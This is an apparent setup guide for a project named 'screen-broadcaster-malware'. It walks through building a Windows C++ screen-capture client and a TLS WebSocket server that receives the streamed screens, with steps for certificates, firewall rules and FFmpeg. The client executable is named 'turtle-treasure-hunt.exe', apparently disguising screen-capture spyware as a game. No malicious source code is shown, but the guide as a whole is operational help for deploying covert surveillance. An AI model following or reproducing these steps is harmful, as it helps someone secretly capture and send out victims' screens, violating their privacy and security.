# Screen Broadcaster Setup Guide - Windows with MinGW

This guide provides step-by-step instructions for setting up the secure screen broadcaster system on Windows using MinGW for C++ compilation.


## Project Structure and Key Files

```
screen-broadcaster-malware/
├── server.crt                    # SSL certificate
├── server.key                    # SSL private key
├── server/
│   ├── app.py                    # Python WebSocket server with SSL
│   ├── templates/index.html      # Web viewer interface
│   └── static/                   # CSS/JS files
└── producer/
    ├── CMakeLists.txt            # Main build configuration
    └── recorder/
        ├── ca.pem                # Copy of server certificate
        ├── config.ini            # Client configuration
        ├── CMakeLists.txt        # Recorder build config
        ├── ffmpeg/
        │   └── ffmpeg.exe        # FFmpeg binary for video processing
        ├── src/
        │   ├── main.cpp          # Entry point
        │   ├── ws_client.cpp     # WebSocket client with TLS
        │   ├── capture.cpp       # Screen capture
        │   └── ...
        └── include/
            ├── ws_client.hpp     # WebSocket client header
            └── ...
```




## Table of Contents
1. [Prerequisites](#prerequisites)
2. [MinGW and Development Environment Setup](#mingw-and-development-environment-setup)
3. [SSL Certificate Generation](#ssl-certificate-generation)
    * [Option 1: Trusted SSL Certificate with Let's Encrypt using win-acme (Recommended for Windows Server)](#option-1-trusted-ssl-certificate-with-lets-encrypt-using-win-acme-recommended-for-windows-server)
    * [Option 2: Self-Signed Certificate (For Testing Only)](#option-2-self-signed-certificate-for-testing-only)
4. [FFmpeg Setup](#ffmpeg-setup)
5. [Python Server Setup](#python-server-setup)
6. [C++ Client Build and Configuration](#c-client-build-and-configuration)
8. [Running the System](#running-the-system)

## Prerequisites

### System Requirements
- Windows 10/11 (64-bit recommended)
- Administrator privileges for certificate installation
- Internet connection for package downloads
- Domain name with DNS control (for SSL certificate)

### Required Software
- Git for Windows
- Python 3.8 or higher
- MinGW-w64 (Minimalist GNU for Windows)
- CMake 3.16 or higher
- OpenSSL development libraries

## MinGW and Development Environment Setup

### 1. Install Git for Windows
1. Download Git from https://git-scm.com/download/win
2. Install with default settings
3. This provides Git Bash which we'll use for commands

### 2. Install MinGW-w64
1. Download MSYS2 from https://www.msys2.org/
2. Install MSYS2 following the installation guide
3. Open MSYS2 terminal and update the package database:
   ```bash
   pacman -Syu
   ```
4. Install MinGW-w64 toolchain and development tools:
   ```bash
   pacman -S mingw-w64-x86_64-toolchain
   pacman -S mingw-w64-x86_64-cmake
   pacman -S mingw-w64-x86_64-openssl
   pacman -S mingw-w64-x86_64-zlib
   pacman -S mingw-w64-x86_64-pkg-config
   pacman -S make
   ```

### 3. Set Environment Variables
1. Add MinGW-w64 to your Windows PATH:
   - Add `C:\msys64\mingw64\bin` to your system PATH
   - Add `C:\msys64\usr\bin` to your system PATH


### 4. Install Python and Dependencies
1. Download Python from https://python.org (3.8 or higher)
2. Install with "Add to PATH" option checked
3. Install required Python packages:
   ```bash
   pip install flask flask-sock gevent simple-websocket
   ```

## SSL Certificate Generation

### Option 1: Trusted SSL Certificate with Let's Encrypt using win-acme (Recommended for Windows Server)
For a production environment on a Windows Server, it is highly recommended to use a trusted SSL certificate from a Certificate Authority like Let's Encrypt. win-acme is a popular client for Windows that simplifies obtaining and renewing these certificates.

Follow the detailed instructions in the section: [Example: Using Let's Encrypt with win-acme (for Windows Server)](#example-using-lets-encrypt-with-win-acme-for-windows-server)

### Option 2: Self-Signed Certificate (For Testing Only)

#### 2.1. Generate Self-Signed SSL Certificates (using Git Bash or MSYS2)
```bash
# Navigate to your project directory
cd /path/to/screen-broadcaster-malware

# Generate private key
openssl genrsa -out server.key 2048

# Generate certificate signing request (replace socket.domain.com with your domain)
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=socket.domain.com"

# Generate self-signed certificate (valid for 365 days)
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt

# Copy certificate for client verification
cp server.crt producer/recorder/ca.pem
```

### Certificate Files Created
- `server.key` - Private key for the server
- `server.crt` - SSL certificate for the server (trusted if from Let's Encrypt)
- `server.csr` - Certificate signing request (can be deleted)
- `producer/recorder/ca.pem` - Copy of server certificate for client verification



### 8. Configure Windows Firewall to Allow Port 80 and 443
These steps are for configuring the Windows Firewall on your Windows Server (e.g., an ECS instance) to allow incoming connections on port 80 and 443 for the WSS server.

1.  **Open Windows Defender Firewall with Advanced Security**:
    *   You can search for "Windows Defender Firewall" in the Start Menu.
    *   Click on "Advanced settings" on the left pane.
2.  **Navigate to Inbound Rules**:
    *   In the left-hand pane, click on `Inbound Rules`.
3.  **Create a New Rule**:
    *   In the right-hand pane (under "Actions"), click on `New Rule...`.
4.  **Rule Type**:
    *   Select `Port` and click `Next`.
5.  **Protocol and Ports**:
    *   Select `TCP`.
    *   Select `Specific local ports:` and enter `80,443`.
    *   Click `Next`.
6.  **Action**:
    *   Select `Allow the connection`.
    *   Click `Next`.
7.  **Profile**:
    *   Ensure all profiles that apply to your server's environment are checked (typically `Domain`, `Private`, and `Public` for broad accessibility, but adjust based on your security policies).
    *   Click `Next`.
8.  **Name**:
    *   Enter a descriptive name for the rule, for example, `Allow HTTPS (Port 443)` or `ScreenBroadcaster WSS`.
    *   Optionally, add a description.
9.  **Finish**:
    *   Click `Finish` to create and enable the rule.

After completing these steps, your Windows Server firewall will permit inbound traffic on TCP port 443, allowing clients to connect to your secure WebSocket server.

## FFmpeg Setup

### 1. Download FFmpeg for Windows
1. Visit https://www.gyan.dev/ffmpeg/builds/
2. Navigate to the "git master builds" section
3. Download `ffmpeg-git-essentials.7z`
4. Extract the archive using 7-Zip or WinRAR
5. Navigate to the extracted folder and locate `ffmpeg.exe` (usually in the `bin/` subdirectory)

### 2. Install FFmpeg in Project
```bash
# Navigate to your project directory
cd /path/to/screen-broadcaster-malware/producer/recorder

# Create ffmpeg directory
mkdir -p ffmpeg

# Copy ffmpeg.exe to the project (replace the path with your extracted ffmpeg location)
cp /path/to/extracted/ffmpeg/bin/ffmpeg.exe ffmpeg/ffmpeg.exe
```



## Python Server Setup

### 1. Server Configuration
The Python server (`server/app.py`) is already configured for WSS on port 443. Key features:
- Uses `gevent.pywsgi.WSGIServer` with SSL context
- Loads SSL certificate and private key
- Listens on port 443 for secure WebSocket connections

### 2. Verify Server Dependencies
```bash
cd server
pip install -r requirements.txt  # If you create one, or install manually:
pip install flask flask-sock gevent simple-websocket
```

## C++ Client Build and Configuration

### 1. Clone and Prepare the Project
```bash
# Clone the repository (if not already done)
git clone <repository-url>
cd screen-broadcaster-malware

```

### 2. Configure the Client
Edit `producer/recorder/config.ini`:
```ini
[websocket]
host = socket.domain.com
...

[capture]
fps = 30
quality = 80
```

### 3. Build the C++ Client (using MSYS2 MinGW64 terminal)
```bash
# Open MSYS2 MinGW 64-bit terminal (not regular MSYS2)
cd /path/to/screen-broadcaster-malware/producer

# Create build directory
mkdir build
cd build

# Configure with CMake (using MinGW Makefiles)
cmake .. -G "MinGW Makefiles" 
  
# Build the project
mingw32-make 

```



## Running the System

### 1. Start the Python Server
```bash
cd server
python app.py
```
Expected output:
```
Successfully loaded SSL certificate from ../server.crt and key from ../server.key
Starting WSS server on https://0.0.0.0:443
```

### 2. Run the C++ Client
In MSYS2 MinGW64 terminal:cd 
```bash
cd producer/build/recorder
./bin/turtle-treasure-hunt.exe
```

### 3. Access the Web Viewer
Open a web browser and navigate to:
```
https://socket.domain.com
```

